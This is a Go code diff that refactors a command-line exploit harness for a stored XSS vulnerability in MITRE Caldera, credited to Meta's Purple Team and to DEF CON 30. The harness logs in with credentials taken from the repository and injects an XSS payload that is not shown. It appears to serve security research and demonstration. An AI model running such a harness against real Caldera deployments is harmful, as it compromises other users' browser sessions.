@@ -40,17 +40,16 @@ import (
 )
 
 var (
-	// StoredXSSUnoCmd runs the XSS vulnerability found before DEF CON 30.
-	StoredXSSUnoCmd = &cobra.Command{
-		Use:   "StoredXSSUno",
-		Short: "Stored XSS found during DEF CON 30.",
+	storedXSSUnoCmd = &cobra.Command{
+		Use:   "storedXSSUno",
+		Short: "First stored XSS found in MITRE Caldera by Jayson Grace from Meta's Purple Team",
 		Run: func(cmd *cobra.Command, args []string) {
 			fmt.Println(color.YellowString(
 				"Introducing stored XSS vulnerability #1, please wait..."))
 
 			caldera.URL = viper.GetString("login_url")
 			caldera.RepoPath = viper.GetString("repo_path")
-			caldera.Creds, err = GetRedCreds(caldera.RepoPath)
+			caldera.Creds, err = getRedCreds(caldera.RepoPath)
 			if err != nil {
 				log.WithError(err).Fatalf(
 					"failed to get Caldera credentials: %v", err)
@@ -66,7 +65,7 @@ var (
 
 			caldera.Driver = driver
 
-			caldera, err = Login(caldera)
+			caldera, err = login(caldera)
 			if err != nil {
 				log.WithError(err).Fatal("failed to login to caldera")
 			}
@@ -84,7 +83,7 @@ var (
 )
 
 func init() {
-	rootCmd.AddCommand(StoredXSSUnoCmd)
+	rootCmd.AddCommand(storedXSSUnoCmd)
 	storedXSSUnoSuccess = false
 }
 
@@ -113,7 +112,8 @@ func storedXSSUnoVuln(payload string) error {
 				storedXSSUnoSuccess = true
 
 				if err != nil {
-					panic(err)
+					log.WithError(err).Errorf("failed to handle js: %v", err)
+					return
 				}
 			}()
 		}
@@ -166,7 +166,7 @@ func storedXSSUnoVuln(payload string) error {
 		})); err != nil {
 		log.WithError(err).WithFields(log.Fields{
 			"Payload": payload,
-		}).Error("unexpected error while introducing the exploit")
+		}).Error("unexpected error while exploiting the vulnerability")
 		return err
 	}
 
